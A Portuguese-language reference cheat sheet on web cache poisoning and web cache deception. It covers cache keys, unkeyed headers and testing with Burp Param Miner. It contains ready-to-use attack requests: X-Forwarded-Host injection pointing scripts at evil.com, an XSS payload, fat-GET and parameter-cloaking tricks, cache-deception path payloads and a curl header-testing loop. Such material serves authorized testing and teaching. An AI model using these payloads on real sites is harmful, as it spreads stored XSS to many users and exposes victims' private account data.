# 💾 Guia de referência de envenenamento de cache web

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

> **Notas de precisão:** A chave de cache depende da implementação, das regras e dos cabeçalhos considerados, incluindo Vary; a tabela não é universal ([RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html)). Uma entrada unkeyed fica fora da chave, mas pode influenciar a resposta. Um parâmetro cache buster só isola o teste se fizer efetivamente parte da chave; não se deve presumir que qualquer query string o faça. Os exemplos HTTP são esquemáticos: Content-Length e delimitação do corpo podem não corresponder ao texto apresentado e foram mantidos sem correção. Cache poisoning e [cache deception](https://portswigger.net/web-security/web-cache-deception) descrevem efeitos diferentes; a confirmação exige observar que uma resposta apropriada foi armazenada e entregue sob a chave relevante.

---

<a id="-what-is-cache-poisoning"></a>
## 🎯 O que é o envenenamento de cache

O **envenenamento de cache web** (web cache poisoning) explora o funcionamento da cache para armazenar respostas maliciosas e entregá-las a outros utilizadores.

### Impacto
- 🔴 **XSS em massa** — XSS armazenado que pode atingir vários utilizadores
- 🔴 **Desfiguração do site** — Armazenar conteúdo malicioso em cache
- 🔴 **DoS** — Armazenar respostas de erro em cache
- 🔴 **Ataques de redirecionamento** — Redirecionar utilizadores

---

<a id="-understanding-caching"></a>
## 🔍 Compreender a cache

### Chaves de cache
```
# Normalmente, a chave de cache utiliza:
URL + cabeçalho Host

# Não incluído na chave (unkeyed):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Cabeçalhos personalizados
```

### Detetar a utilização de cache
```bash
# Procurar cabeçalhos de cache
curl -I https://target.com

# Indicadores de cache:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

<a id="-unkeyed-header-injection"></a>
## 💉 Injeção através de cabeçalhos ausentes da chave de cache

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Se a resposta refletir evil.com:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Pode causar um redirecionamento ou confusão de protocolo
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Verificar se o valor é refletido
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Contornar restrições de caminho
```

---

<a id="-attack-techniques"></a>
## 🔥 Técnicas de ataque

### XSS básico através de envenenamento de cache
```http
# 1. Encontrar uma entrada ausente da chave que seja refletida na resposta
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. A resposta é armazenada em cache com XSS
# 3. Os utilizadores recebem o XSS através da cache
```

### Envenenamento de cache através do caminho
```http
# Pedido com caminhos de origem diferentes
GET /page;evil HTTP/1.1
Host: target.com

# Pode ser armazenado com uma chave diferente da esperada
```

### Pedidos GET com corpo (fat GET)
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# O corpo pode afetar a resposta sem fazer parte da chave de cache
```

### Ocultação de parâmetros (parameter cloaking)
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Interpretação diferente pela cache e pela aplicação
```

---

<a id="-web-cache-deception"></a>
## 🛠️ Web cache deception (engano da cache web)

### Diferença em relação ao envenenamento!
```
# Envenenamento: o payload do atacante é armazenado para ser entregue às vítimas
# Engano: os dados da vítima são armazenados e ficam acessíveis ao atacante

# Passos de web cache deception:
1. Induzir a vítima a visitar: /account/settings.css
2. O servidor devolve /account/settings (ignora .css)
3. A cache armazena o conteúdo como recurso público
4. O atacante obtém /account/settings.css da cache
5. Obtém os dados sensíveis da vítima
```

### Payloads
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

<a id="-cache-buster-technique"></a>
## 📊 Técnica de cache buster

### Para os testes
```http
# Adicionar um cache buster para tentar evitar efeitos noutros utilizadores
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Cada teste recebe uma chave de cache única (pressuposto do original; ver nota)
```

---

<a id="-tools"></a>
## 🛠️ Ferramentas

### Param Miner (extensão do Burp)
```
1. Instalar Param Miner a partir da BApp Store
2. Clicar com o botão direito no pedido → Extensions → Param Miner
3. "Guess headers"
4. Procurar cabeçalhos ausentes da chave de cache
```

### Testes manuais
```bash
# Testar cabeçalhos
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

<a id="-common-unkeyed-headers"></a>
## 📋 Cabeçalhos frequentemente ausentes da chave de cache

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

<a id="-resources"></a>
## 📚 Recursos

- [Envenenamento de cache web na PortSwigger](https://portswigger.net/web-security/web-cache-poisoning)
- [Investigação da PortSwigger](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web cache deception (engano da cache web)](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Teste o envenenamento da cache!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
